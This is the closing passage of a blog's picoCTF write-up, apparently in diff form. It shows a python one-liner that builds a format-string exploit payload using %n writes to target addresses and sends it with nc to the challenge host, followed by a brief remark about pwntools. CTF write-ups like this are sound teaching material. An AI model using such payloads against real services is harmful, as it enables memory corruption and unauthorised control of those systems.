+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python3 <span class="nt">-c</span> <span class="s1">'print("%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00")'</span> <span class="o">&gt;</span> payload.txt
+<span class="nb">cat </span>payload.txt | nc rhea.picoctf.net 58955
+</code></pre></div></div>
+<p>Knowing the shape of the final payload, I’m glad that someone figured all this out before me, though I would like to be able to do it by hand eventually. I’m frequently impressed with how clever pwntools can be. We ought to watch out so it doesn’t become sentient.</p>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2024&nbsp;Jake Mullins
+          &nbsp;
+          •
+          &nbsp;Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>
+        </div>
+      </div>
+    </main></body>
+</html>
